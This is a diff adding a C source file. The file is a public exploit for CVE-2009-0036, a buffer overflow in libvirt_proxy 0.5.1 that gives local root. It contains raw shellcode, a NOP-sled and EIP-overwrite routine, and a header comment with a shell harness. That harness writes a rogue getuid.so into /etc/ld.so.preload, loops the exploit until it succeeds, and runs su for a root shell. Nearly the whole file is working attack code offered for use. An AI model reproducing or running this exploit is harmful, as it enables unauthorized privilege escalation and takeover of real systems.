@@ -1,0 +1,187 @@
+/*
+ * cve-2009-0036.c
+ *
+ * libvirt_proxy <= 0.5.1 Local Privilege Escalation Exploit
+ * Jon Oberheide <jon@oberheide.org>
+ * http://jon.oberheide.org
+ *
+ * Information:
+ *
+ *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0036
+ *
+ *   Buffer overflow in the proxyReadClientSocket function in 
+ *   proxy/libvirt_proxy.c in libvirt_proxy 0.5.1 might allow local users to 
+ *   gain privileges by sending a portion of the header of a virProxyPacket 
+ *   packet, and then sending the remainder of the packet with crafted values 
+ *   in the header, related to use of uninitialized memory in a validation 
+ *   check.
+ *   
+ * Usage:
+ *
+ *   We're guessing to hit our NOP sled, so this program should be run in a 
+ *   harness.  Since the shellcode will execute /tmp/run as root, the following
+ *   harness will insert a malicious getuid.so payload in /etc/ld.so.preload.
+ *
+ *   #!/bin/sh
+ *   
+ *   echo "[+] compiling the exploit"
+ *   gcc cve-2009-0036.c -o cve-2009-0036
+ *   
+ *   echo "[+] creating /tmp/getuid.so"
+ *   echo "int getuid(){return 0;}" > /tmp/getuid.c
+ *   gcc -shared /tmp/getuid.c -o /tmp/getuid.so
+ *   
+ *   echo "[+] setting up /tmp/run"
+ *   echo -e "#!/bin/sh" > /tmp/run
+ *   echo -e "touch /tmp/success" >> /tmp/run
+ *   echo -e "echo \"/tmp/getuid.so\" > /etc/ld.so.preload" >> /tmp/run
+ *   chmod +x /tmp/run
+ *   
+ *   echo "[+] starting exploit loop"
+ *   i=0
+ *   rm -f /tmp/success
+ *   while [ ! -e "/tmp/success" ]
+ *   do
+ *           i=$(($i+1))
+ *           echo "RUN NUMBER $i"
+ *           ./cve-2009-0036
+ *   done
+ *   
+ *   echo "[+] our getuid.so is now in ld.so.preload"
+ *   echo "[+] running su to obtain root shell"
+ *   su
+ *
+ * Notes:
+ *
+ *   Tested on Gentoo Linux 32-bit with GCC 4.3.3-r2 and randomize_va_space=1.
+ *   We have a 4096 byte NOP sled before shellcode and EIP followed by 1000 
+ *   NOP/30 byte shellcode bundles until we cause a EFAULT in libvirt_proxy's 
+ *   read(2).  Our total sled is usually around 5k-10k NOPs so it'll take 
+ *   ~800-1600 tries on average to hit it and execute our shellcode.  Each run
+ *   takes ~1 second, so exploitation will probably take 10-20 minutes on
+ *   average.
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <errno.h>
+#include <signal.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/un.h>
+
+#define PROXY_PATH "/usr/libexec/libvirt_proxy"
+#define PROXY_SOCKET_PATH "/tmp/livirt_proxy_conn"
+#define PROXY_PROTO_VERSION 1
+#define PROXY_PACKET_LENGTH 0xffff
+
+/* simple shellcode to execute /tmp/run */
+const char shellcode[]= 
+	"\x31\xdb"
+	"\x8d\x43\x17"
+	"\x99"
+	"\xcd\x80"
+	"\x31\xc9"
+	"\x51"
+	"\x68\x2f\x72\x75\x6e"
+	"\x68\x2f\x74\x6d\x70"
+	"\x8d\x41\x0b"
+	"\x89\xe3"
+	"\xcd\x80";
+
+struct proxy_packet {
+	uint16_t version;
+	uint16_t command;
+	uint16_t serial;
+	uint16_t len;
+};
+
+int
+main(int argc, char **argv)
+{
+	FILE *fp;
+	long ptr;
+	int i, fd, pid, ret;
+        char *pkt, nop[65536];
+	struct sockaddr_un addr;
+	struct proxy_packet req;
+	struct timeval tv;
+
+	signal(SIGPIPE, SIG_IGN);
+
+	/* guess a random offset to jmp to */
+	gettimeofday(&tv, NULL);
+	srand((tv.tv_sec ^ tv.tv_usec) ^ getpid());
+	ptr = 0xbf000000 + (rand() & 0x00ffffff);
+
+	/* fire up the setuid libvirt_proxy */
+	pid = fork();
+	if (pid == 0) {
+		execl(PROXY_PATH, "libvirt_proxy", NULL);
+	}
+
+	memset(nop, '\x90', sizeof(nop));
+
+	/* connect to libvirt_proxy's AF_UNIX socket */
+	fd = socket(PF_UNIX, SOCK_STREAM, 0);
+	if (fd < 0) {
+		printf("[-] failed to create unix socket\n");
+		return 1;
+	}
+
+	memset(&addr, 0, sizeof(addr));
+	addr.sun_family = AF_UNIX;
+	addr.sun_path[0] = '\0';
+	strncpy(&addr.sun_path[1], PROXY_SOCKET_PATH, strlen(PROXY_SOCKET_PATH));
+
+	printf("[+] connecting to libvirt_proxy\n");
+
+	if (connect(fd, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
+		printf("[-] cant connect to libvirt_proxy socket\n");
+		return 1;
+	}
+
+	/* transmit malicious payload to libvirt_proxy */
+	pkt = (char *) &req;
+	memset(&req, 0, sizeof(req));
+	req.version = PROXY_PROTO_VERSION;
+	req.len = PROXY_PACKET_LENGTH;
+
+	printf("[+] sending initial packet header\n");
+	send(fd, pkt, 7, 0);
+
+	usleep(100000);
+
+	printf("[+] sending corrupted length value\n");
+	send(fd, pkt + 7, 1, 0);
+
+	printf("[+] sending primary NOP sled\n");
+	send(fd, nop, 4096, 0);
+
+	printf("[+] sending primary shellcode\n");
+	send(fd, shellcode, 28, 0);
+
+	printf("[+] sending EIP overwrite (0x%lx)\n", ptr);
+	send(fd, &ptr, 4, 0);
+
+	usleep(100000);
+
+	printf("[+] sending secondary NOP/shellcode bundles\n");
+	for (i = 0; i < 100; ++i) {
+		send(fd, nop, 1000, 0);
+		send(fd, shellcode, 28, 0);
+	}
+	close(fd);
+
+	usleep(800000);
+
+	/* clean slate if our guessed addr failed */
+	kill(pid, SIGKILL);
+
+	return 0;
+}
+
+// milw0rm.com [2009-04-27]
